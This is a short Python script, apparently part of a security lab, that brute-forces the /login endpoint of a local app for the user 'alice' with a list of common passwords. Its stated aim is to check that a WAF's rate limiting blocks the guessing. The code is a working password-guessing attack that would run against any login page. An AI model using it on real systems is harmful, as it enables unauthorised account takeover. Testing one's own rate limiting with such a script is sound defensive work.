"""
Brute Force Login Attack Demo
Rapidly tries a list of common passwords against the /login endpoint.
Run it against the WAF entrypoint to verify rate limiting behavior.
"""
import requests
import time

TARGET_BASE = "http://127.0.0.1:8080"

# Common password list (short for demo)
PASSWORDS = [
    "password", "123456", "admin", "letmein", "qwerty",
    "abc123", "monkey", "1234567", "dragon", "master",
    "alice123",   # correct password — should succeed on vulnerable app
]

TARGET_USER = "alice"


def brute_force(base_url: str, label: str):
    print(f"\n[BruteForce] Target: {label} ({base_url})")
    session = requests.Session()
    found = None
    blocked_at = None

    for i, pw in enumerate(PASSWORDS, 1):
        r = session.post(
            f"{base_url}/login",
            data={"username": TARGET_USER, "password": pw},
            allow_redirects=False,
        )
        status = r.status_code
        print(f"  attempt {i:2d}: password={pw!r:15s} → HTTP {status}", end="")

        if status == 429:
            print(" ← RATE LIMITED")
            blocked_at = i
            break
        elif status in (302, 200) and "登录成功" in (r.text or ""):
            print(" ← LOGIN SUCCESS")
            found = pw
            break
        elif status == 302:
            # Redirect after login — check if it's to messages (success) or back to login (fail)
            location = r.headers.get("Location", "")
            if "messages" in location or "login" not in location:
                print(" ← LOGIN SUCCESS (redirect)")
                found = pw
                break
            else:
                print(" ← wrong password")
        else:
            print(" ← wrong password")

        time.sleep(0.05)  # small delay to avoid overwhelming local server

    print()
    if found:
        print(f"  Result: PASSWORD FOUND = {found!r}")
    elif blocked_at:
        print(f"  Result: BLOCKED after {blocked_at} attempts (rate limiting works)")
    else:
        print(f"  Result: Not found in wordlist (tried {len(PASSWORDS)} passwords)")

    return found, blocked_at


if __name__ == "__main__":
    print("=" * 60)
    print("Brute Force Demo")
    print("=" * 60)

    found, blocked = brute_force(TARGET_BASE, "WAF")

    print("\n" + "=" * 60)
    print("Summary:")
    print(f"  WAF target: {'blocked at attempt ' + str(blocked) if blocked else ('cracked: ' + repr(found) if found else 'not cracked')}")
